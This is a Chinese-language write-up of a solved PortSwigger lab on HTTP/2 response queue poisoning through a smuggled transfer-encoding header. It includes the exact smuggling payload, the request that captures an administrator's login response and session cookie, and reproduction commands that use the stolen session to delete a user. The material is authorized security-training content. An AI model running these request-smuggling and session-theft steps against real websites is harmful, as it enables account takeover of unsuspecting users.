---
title: "lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling"
links:
  - target: h2-smuggling-family
    relation: evidences
---

# lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

> evidences: [[h2-smuggling-family]]

PortSwigger `request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling`(第 29 批,2026-10-06)。

- 实例:`https://0a72002804ede7d78021b2b400570058.web-security-academy.net/`
- 判定:**solved**(偷到管理员 session → `/admin/delete?username=carlos` → banner 翻牌)。
- 该实例**无缓存头**(与 #3 同 slug 族但不同 lab)。

## 关键步(件:h2_req + conn_reuse + lab_http)

1. **H2.TE 帧**:h2 请求里带一个原生 `transfer-encoding: chunked` 头(h2 层不拦),DATA 体给
   `0\r\n\r\n` 再跟一个完整走私请求。前端降级 h1 时保留 TE → back-end 按 chunked 解析,
   首请求在 `0\r\n\r\n` 结束,余下字节成为新请求:
   ```
   h2_req <inst> --method POST --path / --header 'transfer-encoding: chunked' \
     --data '0\r\n\r\nGET /404probe HTTP/1.1\r\nHost: <inst>\r\n\r\n'
   ```
   回包 `200`(首页)+ `x-cache` 无 —— desync 已产生但响应还在队列里。
2. **捞响应**:另起一条 h1 连接发 `GET /?cb=A`(conn_reuse),拿到的**不是自己的响应**:
   `302 Found, Location: /my-account?id=administrator, Set-Cookie: session=<ADMIN>`
   —— 正是管理员每 ~15s 一次的登录响应(响应队列投毒)。
3. 收口:把该 session 写进 jar(`{"<host>":{"session":"<ADMIN>"}}`)→ `lab_http get /admin` 200(面板 3355B)
   → `lab_http get /admin/delete?username=carlos` 302 → `solved_check` true。

## 要点

- 与批 20 的 h2 splitting(CRLF 注入名字/值)不同:本 lab 的注入点是**原生 TE 头**("downgrades even
  with an ambiguous length"),前端不做 h2 头白名单。
- 投毒后**必须另发一个请求**才能把队列里的"别人的响应"取出来;响应按 FIFO 落到下一请求。
- 管理员登录响应里有 `Set-Cookie: session=` → 直接偷会话,不需要读页内 csrf。

## 复现命令

```
h2_req <inst> --method POST --path / --header 'transfer-encoding: chunked' --data '0\r\n\r\nGET /404probe HTTP/1.1\r\nHost: <HOST>\r\n\r\n' --read-ms 2000
conn_reuse <inst>/ --send-str 'GET /?cb=A HTTP/1.1\r\nHost: <HOST>\r\nConnection: keep-alive\r\n\r\n' --read-ms 2500   # -> 302 /my-account?id=administrator + Set-Cookie: session=...
lab_http get <inst>/admin/delete?username=carlos --jar <admin-jar>
```
